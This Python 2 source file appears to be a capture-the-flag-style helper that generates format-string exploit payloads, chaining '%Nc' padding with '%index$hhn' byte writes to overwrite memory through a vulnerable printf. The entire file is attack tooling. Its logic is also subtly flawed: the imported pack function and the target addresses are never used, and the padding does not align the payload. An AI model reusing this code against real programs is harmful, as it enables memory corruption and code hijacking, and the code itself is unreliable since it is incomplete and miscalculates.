from zp import pack

def _fmtstr(prev_size,val,index):
    result = ""
    if prev_size < val:
        result += "%" + str(val - prev_size) + "c"
    elif prev_size == val:
        result += ""
    else:
        result += "%" + str(val - prev_size +256 ) + "c"
    result += "%" + str(index) + "$hhn"
    return result

def fmtstr(offset,data,write_num,write_size):
    payload = ""
    prev_size = 0
    for loop in range(len(data.keys())):
        value = data.values()[loop]
        for i in range(write_num):
            payload += _fmtstr(prev_size,(value >> i*8) & 0xff,offset+i)
            prev_size = (value >> i*8) & 0xff
        offset += write_num
    payload = payload.ljust(len(payload) + len(payload)%8,"A")
    return payload


